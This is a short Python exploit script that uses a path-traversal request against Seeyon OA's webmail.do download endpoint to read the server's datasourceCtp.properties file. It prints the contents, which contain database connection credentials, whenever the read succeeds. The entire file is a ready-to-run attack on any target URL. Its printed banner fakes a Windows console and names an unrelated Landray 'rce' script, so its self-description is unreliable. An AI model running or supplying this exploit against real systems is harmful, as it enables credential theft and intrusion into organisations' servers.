#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36"}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    #print(r.text)
    if "ctpDataSource" in r.text:
        return r.text
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 landray-oa-syssearchmain-rce.py ",target)
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，读取文件 datasourceCtp.properties  结果为：\n", info)
    else:
        print("[-]漏洞不存在")
